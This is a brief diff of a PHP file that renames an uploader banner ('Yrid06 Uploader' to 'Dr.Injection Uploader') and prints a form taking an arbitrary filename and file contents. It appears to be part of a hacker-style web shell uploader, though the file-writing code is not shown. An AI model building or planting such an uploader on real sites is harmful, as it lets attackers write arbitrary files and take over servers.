@@ -1,6 +1,6 @@
 <?php
 
-echo "<b>Yrid06 Uploader<br><br>";
+echo "<b>Dr.Injection Uploader<br><br>";
 echo "Filename: <form method='post'><input type='text' name='file'><br>";
 echo "Filedata:<br><textarea name='data'></textarea><br>";
 echo "<input type='submit' name='upload' value='upload'></form>";
